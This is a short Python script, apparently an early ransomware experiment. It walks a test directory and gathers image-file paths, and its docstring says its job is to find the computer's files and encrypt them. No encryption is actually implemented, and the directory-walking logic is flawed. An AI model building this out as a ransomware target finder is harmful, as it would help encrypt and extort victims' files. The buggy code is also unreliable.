import os 
import shutil

lista_extensoes = [
    '.png', '.jpg', '.jpeg', '.img'
]
lista_arquivos = []
lista_filtro = []


def retornaPath(caminho):
    lista = []
    for caminhos in os.walk(caminho):
        for c in caminhos:
            if os.path.isdir(str(c)):
                lista.append(str(c) + '/')
    return lista


class FindDir:
    global lista_arquivos
    global lista_filtro 

    """""""""""""""""""""""""""""""""""""""""""""""""""
    Encontra os arquivos do computador e os criptografa
    """""""""""""""""""""""""""""""""""""""""""""""""""

    def __init__(self, parametro='/home/marcus/Área de Trabalho/teste_rw'):
        self.parametro = parametro

    def find_dir(self):
        i = 0
        dic = {}
        listaPaths = list()
        os.chdir(self.parametro)
        caminhos = retornaPath(self.parametro)
        for walks in caminhos:
            nome = str(walks) + '/'
            for arquivos in os.listdir(nome):
                if os.path.isdir(arquivos):
                    for caminh in os.listdir(arquivos):
                        if os.path.isdir(arquivos):
                            dic.setdefault(arquivos, caminh)
                elif os.path.isfile(arquivos):
                    lista_arquivos.append(arquivos)
            # formando o caminho:
            for file in lista_arquivos:
                listaPaths.append(str(walks) + file)
            for k, v in dic.items():
                listaPaths.append(str(walks) + k + '/' + v)

            for itens in listaPaths:
                for extensoes in lista_extensoes:
                    if extensoes in itens:
                        lista_filtro.append(itens)
        return lista_filtro


if __name__ == '__main__':
    classe = FindDir()
    print(classe.find_dir())
